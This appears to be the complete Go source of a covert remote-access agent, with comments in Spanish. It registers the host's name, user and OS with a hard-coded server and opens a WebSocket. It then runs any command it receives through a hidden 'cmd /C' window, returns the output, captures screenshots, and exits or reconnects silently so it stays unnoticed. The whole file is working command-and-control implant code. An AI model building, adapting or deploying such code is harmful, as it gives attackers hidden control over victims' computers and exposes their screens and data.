// agent.go
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"github.com/nfnt/resize"
)

var (
	deploymentToken = "DEPLOYMENT_TOKEN_PLACEHOLDER"
	serverURL       = "ws://192.168.1.10:8080/agent"
	baseURL         = "http://192.168.1.10:8080"
	apiKey          string
	agentID         string
)

func main() {
	// No mostrar logs en producción
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// Verificar token
	if deploymentToken == "DEPLOYMENT_TOKEN_PLACEHOLDER" {
		return // Salir silenciosamente si no hay token
	}

	// Activar agente
	if err := activate(); err != nil {
		return // Salir silenciosamente si falla la activación
	}

	// Loop principal
	for {
		err := connectAndRun()
		if err != nil {
			time.Sleep(30 * time.Second) // Esperar antes de reconectar
		}
	}
}

func activate() error {
	// Recopilar información del sistema
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	// Preparar datos de activación
	data := map[string]interface{}{
		"token": deploymentToken,
		"metadata": map[string]string{
			"hostname": hostname,
			"username": username,
			"os":       runtime.GOOS,
			"arch":     runtime.GOARCH,
		},
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	// Enviar solicitud de activación
	resp, err := http.Post(baseURL+"/activate", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("activation failed: %d", resp.StatusCode)
	}

	// Decodificar respuesta
	var result struct {
		AgentID string `json:"agent_id"`
		APIKey  string `json:"api_key"`
		Status  string `json:"status"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	if result.Status != "activated" {
		return fmt.Errorf("unexpected status: %s", result.Status)
	}

	// Guardar credenciales en memoria
	agentID = result.AgentID
	apiKey = result.APIKey

	return nil
}

func connectAndRun() error {
	// Preparar headers con API key
	header := http.Header{}
	header.Add("X-API-Key", apiKey)

	// Conectar al WebSocket
	conn, resp, err := websocket.DefaultDialer.Dial(serverURL, header)
	if err != nil {
		if resp != nil && resp.StatusCode == http.StatusUnauthorized {
			// Si la API key es inválida, intentar reactivar
			if err := activate(); err != nil {
				return err
			}
			return fmt.Errorf("reactivating")
		}
		return err
	}
	defer conn.Close()

	// Enviar información del sistema
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	sysinfo := map[string]string{
		"agent_id": agentID,
		"hostname": hostname,
		"username": username,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
	}

	if err := conn.WriteJSON(sysinfo); err != nil {
		return err
	}

	// Loop de comandos
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return err
		}

		command := string(msg)
		var output string

		switch command {
		case "list_processes", "tasklist":
			output = listProcesses()
		case "get_system_info", "systeminfo":
			output = executeCommand("systeminfo & whoami & hostname & date /T & time /T")
		case "list_services":
			output = listWindowsServices()
		case "screenshot":
			output = captureScreenshot()
		default:
			output = executeCommand(command)
		}

		// Enviar respuesta
		resp := map[string]string{
			"agent_id": agentID,
			"output":   output,
		}
		jsonResp, _ := json.Marshal(resp)

		if err := conn.WriteMessage(websocket.TextMessage, jsonResp); err != nil {
			return err
		}
	}
}

func executeCommand(cmd string) string {
	command := exec.Command("cmd", "/C", cmd)

	// Ocultar ventana al ejecutar
	command.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	output, err := command.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[!] Error: %v\nOutput: %s", err, output)
	}

	return string(output)
}

func listProcesses() string {
	if runtime.GOOS == "windows" {
		return executeCommand("tasklist")
	}
	return executeCommand("ps -aux")
}

func listWindowsServices() string {
	return executeCommand("sc query state= all")
}

func captureScreenshot() string {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return "[!] No active displays"
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Sprintf("[!] Screenshot error: %v", err)
	}

	// Redimensionar para reducir tamaño
	resized := resize.Resize(uint(bounds.Dx()/2), uint(bounds.Dy()/2), img, resize.Lanczos3)

	var buf bytes.Buffer
	if err := png.Encode(&buf, resized); err != nil {
		return fmt.Sprintf("[!] Encoding error: %v", err)
	}

	return "data:image/png;base64," + base64.StdEncoding.EncodeToString(buf.Bytes())
}
